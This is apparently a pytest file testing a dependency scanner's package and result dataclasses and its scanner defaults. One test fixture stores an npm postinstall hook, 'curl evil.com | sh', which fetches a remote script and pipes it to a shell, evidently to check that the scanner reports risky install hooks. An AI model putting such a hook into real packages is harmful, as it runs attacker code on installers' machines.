"""Tests for the dependency scanner."""

import pytest
from datetime import datetime

from ideviewer.dependency_scanner import Package, DependencyResult, DependencyScanner


class TestPackage:
    """Test the Package dataclass."""

    def test_to_dict_basic(self, sample_package):
        data = sample_package.to_dict()
        assert data["name"] == "requests"
        assert data["version"] == "2.31.0"
        assert data["package_manager"] == "pip"
        assert data["install_type"] == "global"
        assert "lifecycle_hooks" not in data

    def test_to_dict_with_lifecycle_hooks(self):
        pkg = Package(
            name="evilpkg",
            version="0.0.1",
            package_manager="npm",
            install_type="project",
            lifecycle_hooks={"postinstall": "curl evil.com | sh"},
        )
        data = pkg.to_dict()
        assert "lifecycle_hooks" in data
        assert data["lifecycle_hooks"]["postinstall"] == "curl evil.com | sh"

    def test_default_install_type(self):
        pkg = Package(name="foo", version="1.0", package_manager="pip")
        assert pkg.install_type == "project"


class TestDependencyResult:
    """Test the DependencyResult dataclass."""

    def test_to_dict_structure(self, sample_dependency_result):
        data = sample_dependency_result.to_dict()
        assert data["total_packages"] == 1
        assert "pip" in data["package_managers_found"]
        assert len(data["packages"]) == 1
        assert "summary" in data
        assert data["summary"]["pip"] == 1

    def test_to_dict_empty(self):
        result = DependencyResult(timestamp=datetime.now())
        data = result.to_dict()
        assert data["total_packages"] == 0
        assert data["packages"] == []
        assert data["summary"] == {}

    def test_packages_by_manager(self):
        result = DependencyResult(
            timestamp=datetime.now(),
            packages=[
                Package(name="flask", version="3.0", package_manager="pip"),
                Package(name="express", version="4.0", package_manager="npm"),
                Package(name="django", version="5.0", package_manager="pip"),
            ],
            package_managers_found=["pip", "npm"],
        )
        data = result.to_dict()
        assert data["summary"]["pip"] == 2
        assert data["summary"]["npm"] == 1
        assert len(data["packages_by_manager"]["pip"]) == 2
        assert len(data["packages_by_manager"]["npm"]) == 1


class TestDependencyScanner:
    """Test the DependencyScanner class."""

    def test_scanner_creation(self):
        scanner = DependencyScanner()
        assert scanner.max_depth == 4
        assert scanner.scan_global is True

    def test_scanner_creation_custom(self):
        scanner = DependencyScanner(max_depth=2, scan_global=False)
        assert scanner.max_depth == 2
        assert scanner.scan_global is False

    def test_scan_returns_dependency_result(self):
        """Scan should return a DependencyResult even with no packages found."""
        scanner = DependencyScanner(scan_global=False, max_depth=0)
        result = scanner.scan()
        assert isinstance(result, DependencyResult)
        assert result.timestamp is not None
        assert isinstance(result.packages, list)

    def test_skip_dirs_set(self):
        """SKIP_DIRS should contain common non-project directories."""
        assert "node_modules" in DependencyScanner.SKIP_DIRS
        assert ".git" in DependencyScanner.SKIP_DIRS
        assert "__pycache__" in DependencyScanner.SKIP_DIRS
